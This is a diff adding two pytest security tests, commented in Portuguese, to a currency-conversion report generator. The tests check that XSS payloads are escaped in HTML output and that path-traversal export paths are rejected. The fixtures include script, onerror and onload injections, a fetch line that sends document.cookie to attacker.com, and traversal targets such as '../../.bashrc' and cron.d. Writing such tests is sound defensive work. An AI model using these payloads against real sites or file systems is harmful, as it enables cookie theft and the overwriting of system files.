@@ -134,3 +134,70 @@ def test_security_numeric_boundary_validation():
 
     with pytest.raises(UnsupportedPPPAssetError):
         raise UnsupportedPPPAssetError("BTC")
+
+
+# ============================================================================
+# 6. Sanitização contra XSS e HTML Injection em Relatórios (OWASP A03)
+# ============================================================================
+
+@pytest.mark.security
+def test_security_report_html_xss_sanitization():
+    """Garante que payloads maliciosos em relatórios sejam estritamente sanitizados."""
+    from datetime import datetime, timezone
+    from src.models import FinancialReportData, ConversionResult
+    from src.reporter import FinancialReportGenerator
+
+    generator = FinancialReportGenerator()
+    malicious_data = FinancialReportData(
+        title="<script>alert('xss_title')</script>",
+        created_at=datetime.now(timezone.utc),
+        conversions=[
+            ConversionResult(
+                amount_from=Decimal("100"),
+                currency_from="USD<img src=x onerror=alert(1)>",
+                amount_to=Decimal("500"),
+                currency_to="BRL",
+                rate=Decimal("5.0"),
+                source="<svg onload=alert(1)>",
+            )
+        ],
+        notes="<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
+    )
+
+    html_out = generator.generate_html(malicious_data)
+
+    # Nenhuma tag maliciosa deve ser renderizada crua
+    assert "<script>alert('xss_title')</script>" not in html_out
+    assert "&lt;script&gt;alert(&#x27;xss_title&#x27;)&lt;/script&gt;" in html_out or "&lt;script&gt;alert('xss_title')&lt;/script&gt;" in html_out
+
+    assert "<img src=x onerror=alert(1)>" not in html_out
+    assert "&lt;img src=x onerror=alert(1)&gt;" in html_out
+
+    assert "<svg onload=alert(1)>" not in html_out
+    assert "&lt;svg onload=alert(1)&gt;" in html_out
+
+    assert "<script>fetch" not in html_out
+
+
+@pytest.mark.security
+def test_security_report_export_path_traversal(tmp_path: Path):
+    """Garante que tentativa de path traversal na exportação de relatórios seja bloqueada."""
+    from datetime import datetime, timezone
+    from src.models import FinancialReportData
+    from src.reporter import FinancialReportGenerator
+    from src.storage import StorageManager
+
+    storage = StorageManager(data_dir=tmp_path)
+    generator = FinancialReportGenerator(storage=storage)
+    data = FinancialReportData(title="Teste", created_at=datetime.now(timezone.utc))
+
+    malicious_paths = [
+        "../../etc/cron.d/malicious.md",
+        "/tmp/overwrite_system.html",
+        "../../.bashrc",
+    ]
+
+    for mal_path in malicious_paths:
+        with pytest.raises(ValueError, match="Caminho de arquivo inválido ou fora do diretório permitido"):
+            generator.export_report_file(data, mal_path, fmt="md")
+
